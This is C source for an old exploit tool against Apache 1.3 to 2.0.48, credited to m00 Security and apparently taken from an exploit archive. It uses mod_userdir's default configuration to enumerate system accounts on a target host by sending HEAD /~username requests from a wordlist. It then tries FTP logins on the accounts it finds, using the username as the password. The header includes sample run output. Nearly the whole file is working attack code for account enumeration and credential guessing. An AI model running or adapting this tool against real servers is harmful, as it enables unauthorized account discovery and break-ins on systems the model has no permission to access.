/* m00-apache-w00t.c
*
* Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.
* ~ Proof-of-Concept edition ~
*
* This tool scans remote hosts with httpd (apache) and disclosure information
* about existens users accounts via wrong default configuration of mod_userdir
* (default apache module). Then attempts to log on ftp with found logins.
*
* Works only against Linux and *BSD boxes.
* Info: http://archives.neohapsis.com/archives/vuln-dev/2000-q3/0065.html
* This is old, but curentlly still actual problem, because 99% of all admins use
* default configuration of apache http server.
*
* This tool scans remote hosts with httpd (apache) and disclosure information 
* about existens users accounts via wrong default configuration of mod_userdir 
* (default apache module). Then attempts to log on ftp with found logins.
* 
* -d4rkgr3y
*
* sh-2.05b$ ./m00-apache-w00t -t localhost -u test_userlist.txt -b
* 
* [*] Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.
* 
* [*] Checking http server [localhost:80]...
* Apache => yes
* Vulnerable => yes
* OS => Mandrake Linux
* [*] Searching for system accounts...
* sergey =>
* m00 =>
* satan => yes
* evil =>
* poison =>
* god =>
* guest =>
* dima =>
* ftp => yes
* vasya =>
* rst =>
* vasi =>
* [*] Searching complete.
* 12 users checked
* 2 users found
* [*] Attempting to log on ftp with login:login...
* satan:satan => no
* ftp:ftp => no
* [*] Complete.
* 0 ftp accounts found
* 
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define DEFAULT_HTTP_PORT 80
#define DEFAULT_FTP_PORT 21

int m00() {
printf("\n[*] Apache 1.3.*-2.0.48 remote users disclosure exploit by m00 Security.\n\n");
printf("\n[*] Downloaded on www.K-OTIK.com\n\n");
}

int verbose(char *d) {
printf("+-----------------------o0o-----------------------+\n");
printf("\n%s",d);
printf("+-----------------------o0o-----------------------+\n");
}

int usage(char *xplname) {
printf("[~] usage: %s -t <host> -u <userlist> [options]\n\n",xplname);
printf("Options:\n");
printf("-p <port> - http port [80]\n");
printf("-l <log_file> - log all attempts to file\n");
printf("-b - try to log on ftp with guessed logins (public version only login:login)\n");
printf("-h - usage\n");
printf("\n");
exit(0);
}

int attempt(char *argv);

int conn(char *ip, unsigned short port) {
struct hostent *hs;
struct sockaddr_in sock;
int sockfd;
bzero(&sock, sizeof(sock));
sock.sin_family = AF_INET;
sock.sin_port = htons(port);
if ((sock.sin_addr.s_addr=inet_addr(ip))==-1) {
if ((hs=gethostbyname(ip))==NULL) {
perror("[-] Error"); exit(0);
}
sock.sin_family = hs->h_addrtype;
memcpy((caddr_t)&sock.sin_addr.s_addr,hs->h_addr,hs->h_length);
}
if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
perror("[-] Error"); exit(0);
}
if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0){
perror("[-] Error "); exit(0);
}
return(sockfd);
}


int main(int argc, char *argv[]) {
FILE *userlist, *logfile;
char *file=NULL;
char *lfile=NULL;
char *host=NULL;
char buf[0x20], check[0x20], request[0xc8], answer[0x3e8], c,logd[0x30];
int i,hand,x,f,v=0,brute=0;
int port = DEFAULT_HTTP_PORT;
int fport = DEFAULT_FTP_PORT;

char c200[0x05] =
"\x20\x32\x30\x30\x20";
char c403[0x0e] =
"\x34\x30\x33\x20\x46\x6f"
"\x72\x62\x69\x64\x64\x65\x6e";
char c404[0x0e] =
"\x34\x30\x34\x20\x4e\x6f\x74"
"\x20\x46\x6f\x75\x6e\x64";
char signature[0x0f] =
"\x53\x65\x72\x76\x65\x72\x3a"
"\x20\x41\x70\x61\x63\x68\x65";
char *http =
"Accept: */*\r\n"
"Accept-Language: en-us,en;q=0.5\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"User-Agent: m00-apache-finger\r\n"
"Connection: close\r\n\r\n";
char **logz;

m00();

if(argc<2) usage(argv[0]);
while((c = getopt(argc, argv, "t:u:hp:vbl:"))!= EOF) {
switch (c) {
case 't':
host=optarg;
break;
case 'u':
file=optarg;
break;
case 'p':
port=atoi(optarg);
break;
case 'l':
lfile=optarg;
break;
case 'b':
brute=1;
break;
case 'v':
v=1;
break;
case 'h':
usage(argv[0]);
return 1;
default:
usage(argv[0]);
return 1;
}
}

if(host==NULL) { usage(argv[0]); }
if(file==NULL) { usage(argv[0]); }

if(lfile && (logfile = fopen(lfile, "a")) == 0) {
printf("[-] unable to open logfile [%s]\n",lfile);
exit(0);
}

if((userlist = fopen(file, "r")) == 0) {
printf("[-] unable to open userlist [%s]\n",file);
exit(0);
}

logz = (char **)malloc(0x666);

printf("[*] Checking http server [%s:%i]...\n",host,port);

hand = conn(host,port);
sprintf(request,"HEAD /~root HTTP/1.1\r\nHost: %s\r\n%s",host,http);

write(hand,request,strlen(request));
recv(hand,answer,0x3e8,0);

if(v) verbose(answer);

printf(" Apache => ");
if(!strstr(answer,signature)) { printf(" no\n Vulnerable => "); } else printf(" yes\n Vulnerable => ");
if(!strstr(answer,c403)) { printf("no\n[-] Exiting...\n"); exit(0); } else printf("yes\n");
close(hand);

hand = conn(host,port);
sprintf(request,"HEAD /~toor HTTP/1.1\r\nHost: %s\r\n%s",host,http);
write(hand,request,strlen(request));
recv(hand,answer,0x3e8,0);

if(v) verbose(answer);

printf(" OS => ");
if(strstr(answer,c403)) { printf("FreeBSD"); } else {
if(strstr(answer,"Unix")) printf("Unix unknow");
if(strstr(answer,"Debian")) printf("Debian Linux");
if(strstr(answer,"RedHat")) printf("RedHat Linux");
if(strstr(answer,"mdk")) printf("Mandrake Linux");
}
close(hand);

printf("\n[*] Searching for system accounts...");

if(lfile) {
sprintf(logd,"Host: %s\nFound accounts:\n",host);
fprintf(logfile,logd);
}

x=0;
f=0;
while (1) {
fgets(buf, 32, userlist);
if (buf[0] == '\n' || strstr(check,buf)) break;
strcpy(check,buf);
buf[strlen(buf)-1] = '\0';
x++;

printf("\n %s \t=> ",buf);


hand = conn(host,port);
sprintf(request,"HEAD /~%s HTTP/1.1\r\nHost: %s\r\n%s",buf,host,http);

write(hand,request,strlen(request));
recv(hand,answer,0x3e8,0);

if(v) verbose(answer);

if(!strstr(answer,c404)) {
printf(" yes",buf);
if(lfile) {
sprintf(logd,"%s\n",buf);
fprintf(logfile,logd);
}
logz[f] = (char *)malloc(strlen(buf));
memcpy(logz[f],buf,strlen(buf));
memset(logz[f]+strlen(buf),0x0,1);
f++;
}
close(hand);
}
fclose(userlist);
printf("\n[*] Searching complete.\n");
printf(" %i users checked\n %i users found\n",x,f);
if(brute && f>0) {
x=0;
i=0;
if(lfile) {
sprintf(logd,"FTP:\n");
fprintf(logfile,logd);
}
printf("[*] Attempting to log on ftp with login:login...\n");
while(x!=f) {
printf(" %s:%s \t=>",logz[x],logz[x]);
hand = conn(host,fport);

sprintf(request,"USER %s\n",logz[x]);
write(hand,request,strlen(request));
recv(hand,answer,0x3e8,0);

sprintf(request,"PASS %s\n",logz[x]);
write(hand,request,strlen(request));
recv(hand,answer,0x3e8,0);
if(strstr(answer,"230")) {
printf(" yes\n");
if(lfile) {
sprintf(logd,"%s:%s\n",logz[x],logz[x]);
fprintf(logfile,logd);
}
i++;
} else printf(" no\n");
close(hand);
x++;
}
printf("[*] Complete.\n");
printf(" %i ftp accounts found\n",i);
}
if(lfile) {
fprintf(logfile,"\n");
fclose(logfile);
}

}
/* m00 */

// milw0rm.com [2003-12-06]
